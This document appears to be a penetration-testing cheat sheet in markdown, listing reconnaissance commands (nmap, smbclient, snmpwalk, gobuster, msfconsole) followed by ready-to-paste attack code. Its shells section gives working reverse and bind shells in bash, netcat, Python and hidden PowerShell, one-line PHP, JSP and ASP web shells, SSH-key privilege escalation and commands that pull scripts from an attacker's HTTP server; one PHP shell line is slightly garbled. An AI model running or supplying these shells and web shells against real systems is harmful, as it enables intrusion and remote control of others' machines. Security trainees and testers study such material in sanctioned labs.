## Getting started 

### SSH

```shell
  ssh <username>@<ip_address>
```

---

### Netcat

```shell
  netcat <ip_address> <port>
  nc <ip_address> <port>

  //banner grabbing
  nc -nv 10.129.42.253 21
```

---

### Tmux

```shell
  tmux -y
```

---

### Vim

```shell
  vim /etc/hosts
```

---

### Nmap 

```shell
  nmap <ip>
  nmap -sC -sV -p- <ip>
  nmap -A -p445 <ip>
  nmap --script smb-os-discovery.nse -p445 <ip>
```

---

### SmbClient 

```shell
  smbclient -L \\\\<ip>
  smbclient -U <username> \\\\<ip>//<share_name>
```

---

### Nmap 

```shell
  nmap <ip>
  nmap -sC -sV -p- <ip>
```

---

### SnmpWalk 

```shell
  snmpwalk -v 2c -c public <ip> 1.3.6.1.2.1.1.5.0
  snmpwalk -v 2c -c private  <ip>
```

---

### Curl

```
  curl -IL <full_url>
```

---

### GoBuster 

```shell
  gobuster dir -u <url> -w /usr/share/seclists/Discovery/Web-Content/common.txt
  gobuster dns -d <domain> -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```

---

### Whatweb
```shell
  whatweb <ip>
  whatweb --no-errors <ip>
```

---

### SearchSploit
```shell
  searchsploit <name_of_service>
```

---

### Msfconsole
```shell
  msfconsole
  search exploit <exploit_name>
  use <exploit_path>
  set RHOSTS=<ip> set LHOST=<local_ip/network_interface>
  check
  exploit
```

---

## Shells

### Reverse shell
```shell
  //attacker
  nc -lvnp 1234

  //target
  bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'

  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f

  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

---

### Bind shell
```shell
  //attacker
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

  python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();

  //target
  nc <attacker_ip> <port>
```

---

### Upgrading TTY
```shell
  python -c 'import pty; pty.spawn("/bin/bash")'

  ^Z;stty raw -echo;fg;[enter][enter]
```

---

### Web Shell
```shell
  //php
  <?php system($_REQUEST["cmd"]); ?>

  //jsp
  <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

  //asp
  <% eval request("cmd") %>
```

---

### Linux Privesc
```shell
  ./linpeas.sh

  sudo -l

  /etc/crontab

  vim id_rsa;chmod 600 id_rsa; ssh root@<ip> -i id_rsa
  
  
```

---

## Transferring Files

### Python server
```shell
  //attacker
  python3 -m http.server 8000

  //target
  wget http://<ip>:8000/linenum.sh
  curl http://<ip>:8000/linenum.sh -o linenum.sh
```

---

### SCP
```shell
  scp linenum.sh <user>@<remotehost/ip>:/tmp/linenum.sh
```

---

### Base64

```shell
  //attacker
  base64 shell -w 0

  //target - echo copied from output
  echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

---

### Validating files

```shell
  file <filename>

  //on both machines and ensure they match
  md5sum shell
```
---

### PHP Web Shells

```shell
  <?php system('id'); ?>
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port>) >/tmp/f
  <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f"); ?>

```
